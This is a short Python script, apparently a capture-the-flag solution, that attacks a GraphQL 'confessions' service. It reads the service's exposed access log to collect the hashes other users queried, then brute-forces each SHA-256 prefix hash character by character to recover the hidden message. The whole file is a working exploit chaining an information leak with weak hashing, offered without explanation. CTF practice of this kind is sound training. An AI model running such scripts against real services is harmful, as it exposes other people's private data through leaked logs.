import requests
import json
from hashlib import sha256
import string

URL = 'https://confessions.lucas.zip/graphql'

def request_get_logs():
    get_logs = '''
    {
    accessLog {
        timestamp
        name
        args
    }
    }
    '''
    data = {
        'query': get_logs,
    }
    response = requests.post(URL, json=data)
    if response.status_code == 200:
        return response.json()['data']['accessLog']
    else:
        return None


def get_confession(hash_value):
    query = '''
    query Q($hash: String) {
        confession(hash: $hash) {
            title
            hash
        }
    }
    '''
    variables = {
        "hash": hash_value
    }
    data = {
        "query": query,
        "variables": variables
    }
    response = requests.post(URL, json=data)
    if response.status_code == 200:
        return response.json().get("data", {}).get("confession", None)
    else:
        return None


def get_hashes():
    hash_tab = []
    logs = request_get_logs()
    if (logs == None):
        return None
    for log in logs:
        if log["name"] == "confession":
            hash_tab.append(json.loads(log["args"])["hash"])
    return hash_tab


def get_all_confessions():
    hashes = get_hashes()
    
    possible_characters = string.printable
    decrypted_message = ""

    for hash in hashes:
        for c in possible_characters:
            possible_string = decrypted_message.encode('utf-8') + c.encode('utf-8')
            if sha256(possible_string).hexdigest() == hash:
                decrypted_message += c

    return decrypted_message


confessions = get_all_confessions()
print(confessions)
